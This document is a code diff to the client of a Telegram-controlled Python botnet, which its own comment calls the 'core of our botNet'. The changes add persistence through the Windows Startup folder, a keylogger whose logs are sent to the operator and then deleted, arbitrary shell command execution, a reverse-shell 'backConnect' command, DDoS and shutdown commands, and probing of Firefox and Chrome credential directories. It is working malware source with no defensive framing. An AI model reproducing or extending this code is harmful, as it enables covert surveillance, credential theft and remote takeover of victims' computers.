@@ -13,6 +13,7 @@ from bs4 import BeautifulSoup
 from pynput.keyboard import Listener
 from getpass import getuser
 
+
 # TODO this is core of our botNet and not complete yet
 
 
@@ -24,8 +25,8 @@ def start_up():
     if platform.system() == "Windows":  # TODO test codes on windows!
         user = node()
         user = user.replace("-PC", "")
-        power = r'copy info.exe "C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start ' \
-                r'Menu\Programs\Startup\"'.format(user)
+        power = r'copy info.exe "C:\Users\"' + str(user) + '"\\AppData\\Roaming\\Microsoft\\Windows\\Start ' \
+                                                           'Menu\\Programs\\Startup\\" '
         system(power)
 
 
@@ -106,20 +107,15 @@ def key_logger(log_dir):
     :param log_dir: enter the directory for save the key logs
     :return: none
     """
+
     logging.basicConfig(filename=(log_dir + "klg.txt"), level=logging.DEBUG, format='%(message)s')
 
-    x = 0
-
     def on_press(key):  # TODO we want after 256 char exit from function
-        nonlocal x
-        x += 1
         logging.info(str(key))
-        if int(x) == 256:
-            print("can't work!")
-            return 0
+        print(listener.is_alive())
 
     with Listener(on_press=on_press) as listener:
-        listener.join()
+        listener.join(1)
 
 
 if __name__ == "__main__":
@@ -127,13 +123,13 @@ if __name__ == "__main__":
     info = info[0:3] + info[4:]
     start_up()
     auto_copy()
-    admin = 0000000000              # add admin id here
-    token = "yourTelegramBotToken"  # add token here
+    admin = "0000000000"      # add admin id here
+    token = "111111:XXXXXXX"  # add token here
     while True:
         finalResult = getting_func()
         data = loads(finalResult)["result"][-1]["message"]["text"]
         sender = str(loads(finalResult)["result"][-1]["message"]["chat"]["id"])
-
+        print(sender + " : " + data)
         if data[0:7] == "/sayHey" and admin == sender:
             message = str(info) + "_i'm_online"
             message_func(message, sender)
@@ -141,7 +137,7 @@ if __name__ == "__main__":
             message = str(info) + "_i'm_downed"
             message_func(message, sender)
             exit()
-        elif data[0:4] == "Hi":
+        elif data[0:4] == "Hi" or data[0:4] == "hi":
             message = "Hi"
             message_func(message, sender)
         elif data[0:6] == "/d_dos" and admin == sender:
@@ -154,7 +150,7 @@ if __name__ == "__main__":
             res = str(check_output(command, shell=True))[2:-1]
             message = str(info) + "_res=" + res
             message_func(message, sender)
-        elif data[0:5] == "/keys" and admin == sender:  # TODO test it
+        elif data[0:5] == "/keys" and admin == sender:  # TODO test it for windows
             if platform.system() == "Linux":
                 user = getuser()
                 log_dir = "/" + str(user) + "/Documents/"
@@ -164,7 +160,7 @@ if __name__ == "__main__":
                 user = user.replace("-PC", "")
                 log_dir = "c:/Users/" + str(user) + "/Documents/"
                 key_logger(log_dir)
-        elif data[0:12] == "/backConnect" and admin == sender:  # TODO handle errors & add this for windows platform
+        elif data[0:12] == "/backConnect" and admin == sender:  # TODO handle errors & add this for windows
             if platform.system() == "Linux":
                 ip = data[13:].split(":")[0]
                 port = data[13:].split(":")[1]
@@ -181,33 +177,62 @@ if __name__ == "__main__":
                 system(command)
                 message = str(info) + "_res=running"
                 message_func(message, sender)
-        elif data[0:10] == "/clearPass" and admin == sender:  # TODO add browser password cleaner
+        elif data[0:10] == "/clearPass" and admin == sender:  # TODO add browser password cleaner, first fix it!!!
             if platform.system() == "Linux":
-                pass
-            else:
-                pass
-        elif data[0:9] == "/downKeys" and admin == sender:
-            if platform.system() == "Linux":  # TODO handle {no such file error} & test for windows
                 user = getuser()
-                command = "less /" + str(user) + "/Documents/klg.txt"
-                res = str(check_output(command, shell=True))[2:-1]
-                message = str(info) + "_keys=" + res
-                message_func(message, sender)
-                command = "rm /" + str(user) + "/Documents/klg.txt"
-                res = str(check_output(command, shell=True))[2:-1]
-                message = str(info) + "_res=" + res + "_logRemoved"
-                message_func(message, sender)
+                try:
+                    command = "ls /" + str(user) + "/.mozilla/firefox/"
+                    res = str(check_output(command, shell=True))[2:-1]
+                    message = str(info) + "_res=" + res
+                    message_func(message, sender)
+                except:
+                    message = str(info) + "_res=firefox_not_found!"
+                    message_func(message, sender)
+                try:
+                    command = "ls /" + str(user) + "/.config/google-chrome/Default/Login/"
+                    res = str(check_output(command, shell=True))[2:-1]
+                    message = str(info) + "_res=" + res
+                    message_func(message, sender)
+                except:
+                    message = str(info) + "_res=chrome_not_found!"
+                    message_func(message, sender)
             else:
                 user = node()
                 user = user.replace("-PC", "")
-                command = "more /" + str(user) + "/Documents/klg.txt"
+                command = "dir C:\\Users\\" + str(user) + "\\AppData\\Local\\Google\\Chrome\\User Data\\"
                 res = str(check_output(command, shell=True))[2:-1]
-                message = str(info) + "_keys=" + res
+                message = str(info) + "_res=" + res
                 message_func(message, sender)
-                command = "del /" + str(user) + "/Documents/klg.txt"
-                res = str(check_output(command, shell=True))[2:-1]
-                message = str(info) + "_res=" + res + "_logRemoved"
-                message_func(message, sender)
+        elif data[0:9] == "/downKeys" and admin == sender:
+            if platform.system() == "Linux":  # TODO test for windows
+                try:
+                    user = getuser()
+                    command = "less /" + str(user) + "/Documents/klg.txt"
+                    res = str(check_output(command, shell=True))[2:-1]
+                    message = str(info) + "_keys=" + res
+                    message_func(message, sender)
+                    command = "rm /" + str(user) + "/Documents/klg.txt"
+                    res = str(check_output(command, shell=True))[2:-1]
+                    message = str(info) + "_res=" + res + "_logRemoved"
+                    message_func(message, sender)
+                except:
+                    message = str(info) + "_res=_No_such_file_plz_fist_run_key_logger"
+                    message_func(message, sender)
+            else:
+                try:
+                    user = node()
+                    user = user.replace("-PC", "")
+                    command = "more /" + str(user) + "/Documents/klg.txt"
+                    res = str(check_output(command, shell=True))[2:-1]
+                    message = str(info) + "_keys=" + res
+                    message_func(message, sender)
+                    command = "del /" + str(user) + "/Documents/klg.txt"
+                    res = str(check_output(command, shell=True))[2:-1]
+                    message = str(info) + "_res=" + res + "_logRemoved"
+                    message_func(message, sender)
+                except:
+                    message = str(info) + "_res=_No_such_file_plz_fist_run_key_logger"
+                    message_func(message, sender)
         elif data[0:9] == "/shutDown" and admin == sender:  # TODO test this command for windows
             message = str(info) + "_i_will_powerOff"
             message_func(message, sender)
